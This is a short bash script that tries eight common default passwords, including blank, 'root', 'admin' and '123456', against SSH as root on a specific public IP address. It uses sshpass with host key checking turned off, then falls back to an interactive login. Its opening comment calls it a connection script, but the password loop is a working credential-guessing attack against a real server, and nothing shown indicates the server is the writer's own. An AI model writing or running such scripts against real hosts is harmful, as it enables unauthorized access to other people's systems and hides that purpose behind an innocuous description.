#!/bin/bash

# Script to connect to the server with interactive password prompt
echo "Attempting to connect to server 185.174.137.43..."

# Try different common passwords
passwords=("" "root" "admin" "password" "123456" "ubuntu" "user" "test")

for pass in "${passwords[@]}"; do
    echo "Trying password: '$pass'"
    if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@185.174.137.43 "echo 'Connection successful!'" 2>/dev/null; then
        echo "Successfully connected with password: '$pass'"
        exit 0
    fi
done

echo "Failed to connect with any common password"
echo "Please provide the correct password or SSH key"

# Interactive connection attempt
echo "Attempting interactive connection..."
ssh -o StrictHostKeyChecking=no root@185.174.137.43